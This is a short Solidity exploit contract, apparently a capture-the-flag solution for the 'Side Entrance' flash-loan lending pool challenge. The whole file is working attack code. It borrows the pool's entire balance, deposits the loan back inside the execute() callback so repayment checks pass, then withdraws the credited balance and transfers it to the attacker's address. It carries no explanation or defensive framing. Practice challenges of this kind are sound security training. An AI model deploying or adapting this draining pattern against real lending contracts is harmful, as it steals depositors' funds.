// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ISideEntranceLenderPool {
    function flashLoan(uint256 amount) external;

    function deposit() external payable;

    function withdraw() external;
}

contract SideCracker {
    ISideEntranceLenderPool public immutable pool;
    address public attacker;

    constructor(address _pool) {
        pool = ISideEntranceLenderPool(_pool);
        attacker = msg.sender;
    }

    receive() external payable {}

    function drainPool() public {
        callFlashLoan();

        pool.withdraw();
        payable(attacker).transfer(address(this).balance);
    }

    function callFlashLoan() public {
        uint256 poolBalance = address(pool).balance;
        pool.flashLoan(poolBalance);
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }
}
